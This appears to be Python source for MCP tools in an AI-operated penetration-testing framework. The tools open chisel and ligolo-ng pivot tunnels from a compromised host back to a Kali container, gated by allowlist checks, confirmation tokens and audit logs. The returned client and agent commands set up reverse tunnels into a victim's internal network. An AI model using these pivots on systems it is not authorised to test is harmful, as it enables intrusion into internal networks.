"""
Pivoting tools: chisel and ligolo-ng tunnels from a compromised host back
into the Kali container, to reach hosts on its internal network.

IMPORTANT — the allowlist is NOT bypassed by a tunnel. Opening a tunnel only
sets up raw network reachability; every MCP tool call still goes through
exec_in_kali(), which re-checks core.security.is_allowed() on every single
call. Before scanning anything reachable only through the tunnel, add that
internal host/CIDR to the allowlist first (manage_allowlist), exactly as you
would for a directly reachable target. Opening the tunnel itself is gated
behind request_high_risk_action(), since standing up routed access to an
internal network is a meaningfully bigger blast radius than a single scan.
"""

from __future__ import annotations

import uuid
from typing import Any

from core.audit import audit
from core.config import LIGOLO_PROXY_PORT, mcp
from core.db import create_session
from core.docker_exec import get_container
from core.security import consume_confirmation, is_allowed


@mcp.tool()
def start_chisel_tunnel(target: str, local_port: int, remote_port: int, confirmation_token: str) -> dict[str, Any]:
    """
    Starts a chisel reverse-tunnel server inside the Kali container,
    listening on `local_port` for a chisel client on `target` to connect
    back and forward `remote_port`.

    Requires a confirmation_token from
    request_high_risk_action(action="start_chisel_tunnel", target=target, justification=...).

    This only sets up network reachability — it does NOT add anything to the
    allowlist. Add any internal host you reach through the tunnel via
    manage_allowlist() before scanning it; every tool still checks the
    allowlist on every call.

    Args:
        target:              The already-compromised host that will run the
                             chisel client and connect back. Must be in the allowlist.
        local_port:          Port the chisel server binds to inside the Kali container.
        remote_port:         Port on `target`'s side to forward through the tunnel.
        confirmation_token:  Token from request_high_risk_action().
    """
    if not is_allowed(target):
        return {"success": False, "error": f"Target '{target}' is not in the allowlist. Use manage_allowlist() first."}

    ok, error = consume_confirmation(confirmation_token, "start_chisel_tunnel", target)
    if not ok:
        return {"success": False, "error": error}

    try:
        container = get_container()
    except RuntimeError as exc:
        return {"success": False, "error": str(exc)}

    tunnel_id  = uuid.uuid4().hex[:12]
    tmux_name  = f"mcp_chisel_{tunnel_id}"
    exit_code, raw = container.exec_run([
        "tmux", "new-session", "-d", "-s", tmux_name,
        "chisel", "server", "--port", str(local_port), "--reverse",
    ])
    if exit_code != 0:
        output = raw.decode("utf-8", errors="replace") if raw else ""
        return {"success": False, "error": f"Failed to start chisel server: {output}"}

    create_session(tunnel_id, target, "pivot-chisel", host=target, port=local_port, status="open")
    audit.info("CHISEL_TUNNEL_OPENED | id=%s target=%s local_port=%s remote_port=%s", tunnel_id, target, local_port, remote_port)

    client_cmd = f"chisel client <this-container-ip>:{local_port} R:{remote_port}:127.0.0.1:{remote_port}"
    return {
        "success": True, "tunnel_id": tunnel_id, "target": target,
        "local_port": local_port, "remote_port": remote_port,
        "client_command": client_cmd,
        "note": (
            "Chisel server is listening. Run the client_command above on the "
            "compromised host (via session_exec if you have an open session for "
            "it) — replace <this-container-ip> with an address of the Kali "
            "container reachable from that host. Remember: hosts reached "
            "through the tunnel still need their own allowlist entry."
        ),
    }


@mcp.tool()
def start_ligolo_tunnel(target: str, confirmation_token: str) -> dict[str, Any]:
    """
    Starts the ligolo-ng proxy server inside the Kali container, ready for
    a ligolo-ng agent run on `target` to connect back and expose its
    network via a routed tun interface — full pivoting, not just a single
    port forward.

    Requires a confirmation_token from
    request_high_risk_action(action="start_ligolo_tunnel", target=target, justification=...).

    This only sets up network reachability — it does NOT add anything to the
    allowlist. Add any internal host/CIDR you reach through the tunnel via
    manage_allowlist() before scanning it; every tool still checks the
    allowlist on every call.

    Args:
        target:              The already-compromised host that will run the
                             ligolo-ng agent and connect back. Must be in the allowlist.
        confirmation_token:  Token from request_high_risk_action().
    """
    if not is_allowed(target):
        return {"success": False, "error": f"Target '{target}' is not in the allowlist. Use manage_allowlist() first."}

    ok, error = consume_confirmation(confirmation_token, "start_ligolo_tunnel", target)
    if not ok:
        return {"success": False, "error": error}

    try:
        container = get_container()
    except RuntimeError as exc:
        return {"success": False, "error": str(exc)}

    tunnel_id = uuid.uuid4().hex[:12]
    tmux_name = f"mcp_ligolo_{tunnel_id}"
    exit_code, raw = container.exec_run([
        "tmux", "new-session", "-d", "-s", tmux_name,
        "ligolo-ng-proxy", "-selfcert", "-laddr", f"0.0.0.0:{LIGOLO_PROXY_PORT}",
    ])
    if exit_code != 0:
        output = raw.decode("utf-8", errors="replace") if raw else ""
        return {"success": False, "error": f"Failed to start ligolo-ng proxy: {output}"}

    create_session(tunnel_id, target, "pivot-ligolo", host=target, port=LIGOLO_PROXY_PORT, status="open")
    audit.info("LIGOLO_TUNNEL_OPENED | id=%s target=%s proxy_port=%s", tunnel_id, target, LIGOLO_PROXY_PORT)

    agent_cmd = f"ligolo-ng-agent -connect <this-container-ip>:{LIGOLO_PROXY_PORT} -ignore-cert"
    return {
        "success": True, "tunnel_id": tunnel_id, "target": target,
        "proxy_port": LIGOLO_PROXY_PORT,
        "agent_command": agent_cmd,
        "note": (
            "ligolo-ng proxy is listening. Run the agent_command above on the "
            "compromised host, then in the proxy console: `session`, then "
            "`start` to bring up the tun interface. Remember: hosts reached "
            "through the tunnel still need their own allowlist entry."
        ),
    }
